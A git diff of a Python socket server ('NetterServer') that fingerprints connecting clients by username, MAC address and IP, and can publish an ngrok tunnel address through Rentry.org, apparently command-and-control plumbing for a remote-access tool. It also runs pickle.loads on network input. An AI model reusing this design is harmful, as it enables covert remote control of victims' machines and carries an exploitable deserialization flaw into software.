@@ -5,19 +5,20 @@ import hashlib, pickle
 from typing import Optional
 
 from .rentry import Rentry
-from .enums import NetterClient, PacketType
+from .enums import NetterClient, PacketType, ClientResponse
 from .handler import ClientHandler
 from .logger import Logging
 from .back_end import backEnd_server
+from .cache import ServerCache
+from .bucket import ConnectionBucket
 
 class ClientWrapper:
     BYTES_CHUNK: int = 2048
-
-    def __init__(
-        self, socket_: socket.socket, netServer: Optional["NetterServer"] = None
-    ) -> None:
+    def __init__(self, socket_: socket.socket, netServer: Optional["NetterServer"] = None) -> None:
         self.socket = socket_
         self.netServer: "NetterServer" = netServer
+
+        self.responseFunction: callable | None = None
 
     def send_(self, packetType: PacketType, data: bytes | str) -> None:
         if isinstance(data, str):
@@ -32,8 +33,12 @@ class ClientWrapper:
         for chunk in range(0, len(data), self.BYTES_CHUNK):
             self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
 
-    def receive(self) -> int | dict[str, bytes]:
+    def receive(self) -> ClientResponse:
         packetLength: int = int.from_bytes(self.socket.recv(4), "big")
+
+        if (self.netServer):
+            self.netServer.console_log('Receiving packet with the length of ' + str(packetLength))
+
         packet_type: int = int.from_bytes(self.socket.recv(2), "little")
         data, total_received = bytearray(), 0
 
@@ -46,19 +51,24 @@ class ClientWrapper:
             data.extend(chunk)
             total_received += len(chunk)
 
-        if (packet_type in [PacketType.CONSOLE_INFO, PacketType.CONSOLE_ERROR, PacketType.CONSOLE_WARNING] and self.netServer):
-            self.netServer.console_log(
-                data.decode("utf-8"),
-                level = PacketType._value2member_map_[packet_type].name[8:],
+        _consoles = [PacketType.CONSOLE_INFO, PacketType.CONSOLE_ERROR, PacketType.CONSOLE_WARNING]
+
+        if (packet_type in _consoles and self.netServer):
+            self.netServer.console_log(data.decode("utf-8"),
+                level = PacketType._value2member_map_[packet_type].name[8:]
             )
+
             return len(data)
 
-        return {
-            "packetType": PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN).name,
-            "data": bytes(data)
-        }
+        return ClientResponse(
+            PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN),
+            bytes(data)
+        )
 
-class NetterServer(Logging):
+    def on_incoming_packet(self, func: callable) -> None:
+        self.__waitingForResponse = func
+
+class NetterServer(Logging, ConnectionBucket):
     bindAddress: tuple[str, int] = None
 
     ngrokAddress: str = None
@@ -78,10 +88,10 @@ class NetterServer(Logging):
         self.bindAddress = bind_address if bind_address else ("localhost", 5000)
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        self.connectionList: list[NetterClient] = list()
+        self.selectedClient: NetterClient = None
         self.alive = True
 
-    def startNgrokTunnel(self, useRentry=False):
+    def startNgrokTunnel(self, useRentry = False):
         """
         This function starts a Ngrok tunnel and optionally updates a Rentry.org entry with the tunnel's address.
 
@@ -150,16 +160,29 @@ class NetterServer(Logging):
                     self.socket.accept()[0], self
                 )
 
-                if _deviceInformation := pickle.loads(clientSocket.receive()["data"]):
+                if _deviceInformation := pickle.loads(clientSocket.receive().data):
                     device: NetterClient = NetterClient(clientSocket,
-                        hashlib.sha256(_deviceInformation["Windows_UUID"].encode()).hexdigest()[:20],
+                        hashlib.sha256(
+                            str(_deviceInformation["MAC_Address"] + _deviceInformation["Username"]).encode('UTF-8')
+
+                        ).hexdigest(),
                         _deviceInformation["Username"],
                         _deviceInformation["Public_IP"],
                         _deviceInformation["Local_IP"],
                     )
 
-                    self.connectionList.append(device)
+                    self.append(device)
                     ClientHandler(clientSocket, device, self).start()
 
         except Exception as e:
             self.console_log(str(e))
+
+    # def wait_for_incoming_packet(self, clientID: str, on_received: callable) -> None:
+    #     if (client := self.get(UUID = clientID)) is None:
+    #         self.console_log('Server waits for incoming requests from an invalid client, aborted.', level = "WARNING")
+    #         return
+
+    #     packet: ClientResponse = client.socket_.receive()
+
+    #     if (packet.data):
+    #         on_received(self, client, packet.data)
